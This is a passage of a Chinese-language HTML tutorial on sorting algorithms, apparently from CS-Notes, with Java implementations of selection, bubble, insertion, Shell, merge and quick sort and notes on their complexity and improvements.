operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> min <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    min <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p>从左到右不断交换相邻逆序的元素，在一轮的循环之后，可以让未排序的最大元素上浮到右侧。</p><p>在一轮循环中，如果没有发生交换，就说明数组已经是有序的，此时可以直接退出。</p><p>以下演示了在一轮循环中，将最大的元素 5 上浮到最右侧。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1a2f2998-d0da-41c8-8222-1fd95083a66b.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1a2f2998-d0da-41c8-8222-1fd95083a66b.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Bubble</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">boolean</span> hasSorted <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>hasSorted<span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            hasSorted <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    hasSorted <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><p>每次都将当前元素插入到左侧已经排序的数组中，使得插入之后左侧数组依然有序。</p><p>对于数组 {3, 5, 2, 4, 1}，它具有以下逆序：(3, 2), (3, 1), (5, 2), (5, 4), (5, 1), (2, 1), (4, 1)，插入排序每次只能交换相邻元素，令逆序数量减少 1，因此插入排序需要交换的次数为逆序数量。</p><p>插入排序的复杂度取决于数组的初始顺序，如果数组已经部分有序了，逆序较少，那么插入排序会很快。</p><ul><li>平均情况下插入排序需要 ~N2/4 比较以及 ~N2/4 次交换；</li><li>最坏的情况下需要 ~N2/2 比较以及 ~N2/2 次交换，最坏的情况是数组是倒序的；</li><li>最好的情况下需要 N-1 次比较和 0 次交换，最好的情况就是数组已经有序了。</li></ul><p>以下演示了在一轮循环中，将元素 2 插入到左侧已经排序的数组中。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/2a8e1442-2381-4439-a83f-0312c8678b1f.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/2a8e1442-2381-4439-a83f-0312c8678b1f.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Insertion</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><p>对于大规模的数组，插入排序很慢，因为它只能交换相邻的元素，每次只能将逆序数量减少 1。</p><p>希尔排序的出现就是为了解决插入排序的这种局限性，它通过交换不相邻的元素，每次可以将逆序数量减少大于 1。</p><p>希尔排序使用插入排序对间隔 h 的序列进行排序。通过不断减小 h，最后令 h=1，就可以使得整个数组是有序的。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/0157d362-98dd-4e51-ac26-00ecb76beb3e.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/0157d362-98dd-4e51-ac26-00ecb76beb3e.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Shell</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;</span> N <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            h <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">*</span> h <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 1, 4, 13, 40, ...</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>h <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> h<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">>=</span> h <span class="token operator">&amp;&amp;</span> <span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j <span class="token operator">-</span> h<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j <span class="token operator">-=</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j<span class="token punctuation">,</span> j <span class="token operator">-</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            h <span class="token operator">=</span> h <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>希尔排序的运行时间达不到平方级别，使用递增序列 1, 4, 13, 40, … 的希尔排序所需要的比较次数不会超过 N 的若干倍乘于递增序列的长度。后面介绍的高级排序算法只会比希尔排序快两倍左右。</p><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><p>归并排序的思想是将数组分成两部分，分别进行排序，然后归并起来。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/220790c6-4377-4a2e-8686-58398afc8a18.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/220790c6-4377-4a2e-8686-58398afc8a18.png" alt="img"></a></p><h3 id="1-归并方法"><a href="#1-归并方法" class="headerlink" title="1. 归并方法"></a>1. 归并方法</h3><p>归并方法将数组中两个已经排序的部分归并成一个。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">MergeSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> aux<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">,</span> <span class="token keyword">int</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> l<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> h<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            aux<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将数据复制到辅助数组</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> l<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> h<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">></span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> aux<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">></span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> aux<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>aux<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> aux<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 先进行这一步，保证稳定性</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> aux<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-自顶向下归并排序"><a href="#2-自顶向下归并排序" class="headerlink" title="2. 自顶向下归并排序"></a>2. 自顶向下归并排序</h3><p>将一个大数组分成两个小数组去求解。</p><p>因为每次都将问题对半分成两个子问题，这种对半分的算法复杂度一般为 O(NlogN)。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Up2DownMergeSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">MergeSort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        aux <span class="token operator">=</span> <span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">Comparable</span><span class="token punctuation">[</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;=</span> l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> l <span class="token operator">+</span> <span class="token punctuation">(</span>h <span class="token operator">-</span> l<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="3-自底向上归并排序"><a href="#3-自底向上归并排序" class="headerlink" title="3. 自底向上归并排序"></a>3. 自底向上归并排序</h3><p>先归并那些微型数组，然后成对归并得到的微型数组。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Down2UpMergeSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">MergeSort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        aux <span class="token operator">=</span> <span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">Comparable</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> sz <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> sz <span class="token operator">&lt;</span> N<span class="token punctuation">;</span> sz <span class="token operator">+=</span> sz<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> lo <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> lo <span class="token operator">&lt;</span> N <span class="token operator">-</span> sz<span class="token punctuation">;</span> lo <span class="token operator">+=</span> sz <span class="token operator">+</span> sz<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> lo<span class="token punctuation">,</span> lo <span class="token operator">+</span> sz <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>lo <span class="token operator">+</span> sz <span class="token operator">+</span> sz <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="1-基本算法"><a href="#1-基本算法" class="headerlink" title="1. 基本算法"></a>1. 基本算法</h3><ul><li>归并排序将数组分为两个子数组分别排序，并将有序的子数组归并使得整个数组排序；</li><li>快速排序通过一个切分元素将数组分为两个子数组，左子数组小于等于切分元素，右子数组大于等于切分元素，将这两个子数组排序也就将整个数组排序了。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f8047846-efd4-42be-b6b7-27a7c4998b51.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f8047846-efd4-42be-b6b7-27a7c4998b51.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">shuffle</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;=</span> l<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">shuffle</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        List<span class="token operator">&lt;</span>Comparable<span class="token operator">></span> list <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>        Collections<span class="token punctuation">.</span><span class="token function">shuffle</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">toArray</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="2-切分"><a href="#2-切分" class="headerlink" title="2. 切分"></a>2. 切分</h3><p>取 a[l] 作为切分元素，然后从数组的左端向右扫描直到找到第一个大于等于它的元素，再从数组的右端向左扫描找到第一个小于它的元素，交换这两个元素。不断进行这个过程，就可以保证左指针 i 的左侧元素都不大于切分元素，右指针 j 的右侧元素都不小于切分元素。当两个指针相遇时，将切分元素 a[l] 和 a[j] 交换位置。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/766aedd0-1b00-4065-aa2b-7d31138df84f.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/766aedd0-1b00-4065-aa2b-7d31138df84f.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">partition</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> h<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> h <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    T v <span class="token operator">=</span> nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">less</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token operator">++</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">!=</span> h<span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">less</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> nums<span class="token punctuation">[</span><span class="token operator">--</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">!=</span> l<span class="token punctuation">)</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> j<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="3-性能分析"><a href="#3-性能分析" class="headerlink" title="3. 性能分析"></a>3. 性能分析</h3><p>快速排序是原地排序，不需要辅助数组，但是递归调用需要辅助栈。</p><p>快速排序最好的情况下是每次都正好能将数组对半分，这样递归调用次数才是最少的。这种情况下比较次数为 CN=2CN/2+N，复杂度为 O(NlogN)。</p><p>最坏的情况下，第一次从最小的元素切分，第二次从第二小的元素切分，如此这般。因此最坏的情况下需要比较 N2/2。为了防止数组最开始就是有序的，在进行快速排序时需要随机打乱数组。</p><h3 id="4-算法改进"><a href="#4-算法改进" class="headerlink" title="4. 算法改进"></a>4. 算法改进</h3><h4 id="4-1-切换到插入排序"><a href="#4-1-切换到插入排序" class="headerlink" title="4.1 切换到插入排序"></a>4.1 切换到插入排序</h4><p>因为快速排序在小数组中也会递归调用自己，对于小数组，插入排序比快速排序的性能更好，因此在小数组中可以切换到插入排序。</p><h4 id="4-2-三数取中"><a href="#4-2-三数取中" class="headerlink" title="4.2 三数取中"></a>4.2 三数取中</h4><p>最好的情况下是每次都能取数组的中位数作为切分元素，但是计算中位数的代价很高。人们发现取 3 个元素并将大小居中的元素作为切分元素的效果最好。</p><h4 id="4-3-三向切分"><a href="#4-3-三向切分" class="headerlink" title="4.3 三向切分"></a>4.3 三向切分</h4><p>对于有大量重复元素的数组，可以将数组切分为三部分，分别对应小于、等于和大于切分元素。</p><p>三向切分快速排序对于只有若干不同主键的随机数组可以在线性时间内完成排序。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreeWayQuickSort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">QuickSort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token 